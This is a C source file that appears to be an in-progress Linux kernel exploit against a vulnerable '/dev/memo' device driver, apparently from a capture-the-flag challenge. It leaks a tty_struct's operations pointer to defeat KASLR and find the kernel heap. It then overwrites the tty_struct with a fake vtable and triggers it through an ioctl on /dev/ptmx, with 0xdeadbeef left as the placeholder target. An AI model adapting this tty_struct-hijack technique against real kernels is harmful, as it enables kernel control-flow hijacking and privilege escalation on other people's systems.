#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/ioctl.h>
#include <sys/types.h>

#define ulong unsigned long long

int main()
{
    int memo = open("/dev/memo",O_RDWR);
    int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    char buf[0x400];
    ulong off_ptm_unix98_ops_kernbase = 0xe65980;
    ulong kernal_leak;
    lseek(memo,0x300,SEEK_SET);
    read(memo,buf,0x400);
    kernal_leak = *(ulong *)(buf + 0x100 + 0x18);
    printf("[*] Kernel Address Leked - ptm_unix98_ops: 0x%lx\n",kernal_leak);
    ulong kernel_base = kernal_leak - off_ptm_unix98_ops_kernbase;
    printf("[!] Kernel Base Leaked: 0x%lx\n",kernel_base);
    ulong heap_leak = *(ulong *)(buf + 0x100 + 0x38);
    printf("[*] Kernel Heap Leak: 0x%lx\n",heap_leak);
    ulong kernal_heap = heap_leak - 0x438;
    printf("[!] Memo Heap Start: 0x%lx\n",kernal_heap);
    *(ulong *)(buf + 0xc*8) = 0xdeadbeef; // fake ioctl entry
    *(ulong *)(buf + 0x100 + 0x18) = kernal_heap + 0x300; //fake vtable ptr
    printf("[DEBUG] TTY_STRUCT: 0x%llx\n",kernal_heap+0x400);
    lseek(memo,0x300,SEEK_SET);
    write(memo,buf,0x400);
    ioctl(ptmx,0xdeadaaaa,0xcafebabe);
    return 0;
}